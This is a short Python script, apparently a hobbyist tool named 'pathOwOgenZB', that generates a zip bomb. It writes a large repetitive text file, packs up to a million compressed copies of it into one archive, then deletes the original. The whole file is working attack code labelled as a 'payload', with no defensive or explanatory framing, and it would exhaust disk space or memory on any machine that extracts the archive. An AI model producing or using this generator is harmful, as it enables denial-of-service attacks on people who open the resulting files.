# This is CLOSED SOURCE software, written by Arco Nightshade.

import os
import zipfile

print("Welcome to pathOwOgenZB by Arco!")
print("Current working directory:", os.getcwd())

size_mb = input("Payload size in mb (Full number): ")
size_mb = int(size_mb)

def create_payload(payload_name = "pathOwOgen.md", payload_contents = "Uh oh! Looks like you got a pathOwOgen! "):
    with open(payload_name, "w") as OwOgen:
        OwOgen.write(payload_contents * 1024 * 1024 * size_mb)
    print(f"Final payload: {payload_name} ({size_mb}MB)")

while True:
    zip_name = input("Zip name (Has to have .zip at end): ")
    if str(".zip") in zip_name:
        break
    else:
        print("Please make sure the name has '.zip' in it!")


copies = int(input("How many copies of the payload should be in the final zip? (Should be a full, non-negative number, never past 1,000,000.) "))


def zipper(payload_name = "pathOwOgen.md"):
    with zipfile.ZipFile(zip_name, "w", compression=zipfile.ZIP_DEFLATED) as Z:
        for i in range(copies):
            Z.write(payload_name, arcname=f"OwOgen{i}.md")
            print(f"Added file {i}")
        print()
        print(f"Added {i + 1} files total")
    print(f"PathOwOgenZB Zip created: {zip_name} with {copies} files.")

create_payload()
zipper()

os.remove("pathOwOgen.md")
print("Removed the payload file")